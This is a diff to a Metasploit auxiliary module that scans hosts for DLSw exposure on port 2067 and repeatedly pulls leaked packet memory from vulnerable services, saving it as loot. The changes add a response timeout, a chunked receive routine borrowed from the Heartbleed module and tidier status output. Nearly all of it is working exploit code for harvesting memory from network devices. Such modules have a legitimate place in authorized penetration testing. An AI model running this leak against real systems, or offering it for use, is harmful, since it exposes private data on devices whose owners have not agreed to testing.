@@ -38,13 +38,21 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(2067),
-        OptInt.new('LEAK_AMOUNT', [true, 'The number of bytes to store before shutting down.', 1024])
+        OptInt.new('LEAK_AMOUNT', [true, 'The number of bytes to store before shutting down.', 1024]),
+        OptInt.new('RESPONSE_TIMEOUT', [true, 'Number of seconds to wait for a server response', 5])
       ], self.class)
+  end
+
+  def peer
+    peer = "#{rhost}:#{rport}"
+  end
+
+  def response_timeout
+    datastore['RESPONSE_TIMEOUT']
   end
 
   # Called when using check
   def check_host(ip)
-    peer = "#{ip}:#{rport}"
     print_status("Checking #{peer} for DLSw exposure")
     response = get_response
 
@@ -70,20 +78,37 @@ class Metasploit3 < Msf::Auxiliary
 
   def get_response(size = 1024)
     connect
-    response = sock.recv(size)
+    response = get_data(size)
     disconnect
     response
+  end
+
+  # Borrowed from https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb
+  def get_data(length = -1)
+
+    return sock.get_once(-1, response_timeout) if length == -1
+
+    to_receive = length
+    data = ''
+    while to_receive > 0
+      temp = sock.get_once(to_receive, response_timeout)
+      break if temp.nil?
+
+      data << temp
+      to_receive -= temp.length
+    end
+    data
   end
 
   # Main method
   def run_host(ip)
     return unless check_host(ip) == Exploit::CheckCode::Vulnerable
 
-    print_status("#{ip}:#{rport} Waiting for #{datastore['LEAK_AMOUNT']} bytes of leaked data")
+    print_status("#{peer}: Waiting for #{datastore['LEAK_AMOUNT']} bytes of leaked data")
 
     dlsw_data = ''
     until dlsw_data.length > datastore['LEAK_AMOUNT']
-      response = get_response
+      response = get_response(72)
       unless response.blank?
         dlsw_data << response[18..72] # range of the leaked packet contents
       end
@@ -100,6 +125,7 @@ class Metasploit3 < Msf::Auxiliary
       'DLSw_leaked_data',
       'DLSw packet memory leak'
     )
-    print_status("#{ip}:#{rport}: DLSw leaked data stored in #{path}")
+    print_status("#{peer}: DLSw leaked data stored in #{path}")
   end
 end
+
